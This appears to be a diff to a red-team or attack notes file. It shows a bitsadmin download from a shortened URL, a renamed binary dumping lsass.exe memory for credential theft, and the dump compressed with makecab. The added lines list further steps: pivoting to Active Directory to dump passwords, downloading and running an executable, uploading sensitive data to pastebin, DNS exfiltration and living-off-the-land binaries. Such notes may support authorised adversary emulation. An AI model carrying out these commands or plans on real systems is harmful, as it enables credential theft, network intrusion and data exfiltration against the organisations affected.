@@ -210,3 +210,13 @@ bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C
 cd C:\Users\Public\
 C:\Users\Public\1.exe -accepteula -ma lsass.exe lsass.dmp
 makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
+
+---------
+
+Open notepad on AD and Win10 with insert text (Incriminating evidence. ) 
+Piviot to AD and dump ad passwords
+Dump all AD usernames and info
+Download a exec and excute it
+Upload sensitive data to paste bin.
+DNS exfil
+LOLBAS
